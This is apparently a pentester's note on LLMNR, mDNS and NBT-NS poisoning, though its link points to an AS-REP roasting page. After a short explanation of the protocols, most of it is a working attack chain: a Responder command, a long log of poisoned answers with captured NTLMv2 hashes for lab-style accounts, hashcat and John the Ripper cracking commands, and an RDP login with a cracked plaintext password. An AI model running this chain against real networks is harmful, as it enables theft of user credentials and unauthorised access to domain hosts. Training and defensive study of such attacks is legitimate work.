Link: https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html

**LMNR (Link-Local Multicast Name Resolution)** , mDNS (Multicast DNS), and
NBT-NS (NetBIOS Name Service) are all protocols used for name resolution in
computer networks. They serve the purpose of translating human-readable hostnames
into IP addresses, allowing devices to locate and communicate with each other on a
network.

1. **LLMNR (Link-Local Multicast Name Resolution):**
* Purpose: LLMNR is primarily used in IPv4 networks when DNS (Domain Name System) resolution fails. It operates at the link-local scope, meaning it is limited to a single subnet.
* Method: LLMNR uses multicast communication to resolve names. When a device needs to resolve a hostname to an IP address, it sends out a multicast query to the local network segment. If the device with the requested name is on the same subnet, it can respond with its IP address.

2. **mDNS (Multicast DNS):**
* Purpose: mDNS is similar to LLMNR but is designed to work in both IPv4 and IPv6 networks. It is often used in small networks or ad-hoc configurations where a traditional DNS server is not available.
* Method: Like LLMNR, mDNS uses multicast communication. Devices on the network can broadcast their hostname and IP address information, allowing others to discover and communicate with them without the need for a centralized DNS server.

3. **NBT-NS (NetBIOS Name Service):**
* Purpose: NBT-NS is part of the NetBIOS over TCP/IP suite and is used for name resolution in Windows networks. It is an older protocol that has been largely superseded by DNS, but it is still present in many networks for backward compatibility.
* Method: NBT-NS uses a combination of broadcast and unicast messages to resolve NetBIOS names to IP addresses. Devices on the network can broadcast requests for the IP address associated with a particular NetBIOS name, and the device with that name responds.

```
responder -I eth1
```

Wait and grab the hash
Example outputs:
```bash
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[DNS] Poisoned response: captive.apple.com -> 10.50.10.254
[DNS] Poisoned response: captive.apple.com -> 10.50.10.254
[DNS] Poisoned response: captive.apple.com -> 10.50.10.254
[*] [NBT-NS] Poisoned answer sent to 10.2.10.11 for name BRAVOS (service: File Server)
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[SMB] NTLMv2-SSP Client   : 10.2.10.11
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:360cd23d4cabd74d:46320CD2C2AEBFC039AD451FAA73E6DE:010100000000000000B73D0D1514DD012FBDAE4BC87E6624000000000200080039004A004500550001001E00570049004E002D0034004B0048004D005A0052004E0030004C005100520004003400570049004E002D0034004B0048004D005A0052004E0030004C00510052002E0039004A00450055002E004C004F00430041004C000300140039004A00450055002E004C004F00430041004C000500140039004A00450055002E004C004F00430041004C000700080000B73D0D1514DD010600040002000000080030003000000000000000000000000030000090E7E5A21598C9CB073E26946AB7B6D0265638D5ED12A27D1A7FF4C2024C80A60A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[*] Skipping previously captured hash for NORTH\robb.stark
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Bravos
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Bravos.local
[*] Skipping previously captured hash for NORTH\robb.stark
[DNS] Poisoned response: wpad.home.arpa -> 10.50.10.254
[DNS] Poisoned response: settings-win.data.microsoft.com -> 10.50.10.254
[DNS] Poisoned response: ctldl.windowsupdate.com -> 10.50.10.254
[DNS] Poisoned response: settings-win.data.microsoft.com -> 10.50.10.254
[DNS] Poisoned response: ctldl.windowsupdate.com -> 10.50.10.254
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] [NBT-NS] Poisoned answer sent to 10.2.10.11 for name MEREN (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Meren
[SMB] NTLMv2-SSP Client   : 10.2.10.11
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:c09b0d8bf2431c7b:B03E02403B9D8873FC5FD87FE2F6E34E:010100000000000000B73D0D1514DD01D98F381817E728AE000000000200080039004A004500550001001E00570049004E002D0034004B0048004D005A0052004E0030004C005100520004003400570049004E002D0034004B0048004D005A0052004E0030004C00510052002E0039004A00450055002E004C004F00430041004C000300140039004A00450055002E004C004F00430041004C000500140039004A00450055002E004C004F00430041004C000700080000B73D0D1514DD010600040002000000080030003000000000000000000000000030000090E7E5A21598C9CB073E26946AB7B6D0265638D5ED12A27D1A7FF4C2024C80A60A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Meren
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] Skipping previously captured hash for NORTH\eddard.stark
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] [MDNS] Poisoned answer sent to 10.2.10.11      for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 10.2.10.11 for name Meren
[*] Skipping previously captured hash for NORTH\eddard.stark

```

Notice the username with the HASHes

Crack with hashcat:, ntlmv2, examples: https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m 5600 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

Else, also try John the Ripper:
```
john --wordlist=/usr/share/wordlists/rockyou.txt responder-hash.txt
```

RDP to DC with new creds:
```
xfreerdp /v:10.2.10.11 /u:robb.stark /p:sexywolfy /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```